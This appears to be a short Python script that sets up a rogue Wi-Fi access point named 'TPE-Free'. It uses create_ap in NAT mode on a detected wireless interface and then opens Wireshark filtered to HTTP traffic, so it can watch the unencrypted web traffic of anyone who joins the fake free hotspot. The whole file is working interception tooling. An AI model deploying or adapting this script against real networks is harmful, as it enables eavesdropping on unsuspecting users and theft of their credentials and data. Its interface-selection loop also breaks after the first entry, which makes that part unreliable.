import subprocess
import sys
import shlex
import time
from utils import search_ifaces
from utils import gateway_detect

def start_rogueAP(wlan_id, gateway_interface):
    ws_filters = str('"http"')
    ap_command = str(f"x-terminal-emulator -e 'sudo create_ap --no-virt -m nat {wlan_id} {gateway_interface} TPE-Free'")
    ws_command = str(f"x-terminal-emulator -e 'sudo wireshark -k -i {wlan_id} -Y {ws_filters} '")
    #print(wlan_id, ethernet_id)
    subprocess.Popen(shlex.split(ap_command))
    #    Wait 10 seconds for AP to be fully initialized
    time.sleep(10)

    subprocess.Popen(shlex.split(ws_command))

def main():
    wireless_ifaces, iface_list = search_ifaces()
    #ethernet = interfaces["ethernet"]
    gateway_list = gateway_detect(iface_list)
    print(len(gateway_list))
    #for i in gateway_list:
    #    if ethernet in i:
    #        try:
    #            gateway = i
    #        except Exception as e:
    #            print(e)
    #            print("LIST OR i VARIABLE IS POSSIBLY EMPTY")
    gateway = gateway_list[-1]

    for w_iface in wireless_ifaces:
        if w_iface != gateway:
            wlan = w_iface
        break
    start_rogueAP(wlan, gateway)

if __name__ == "__main__":
    main()
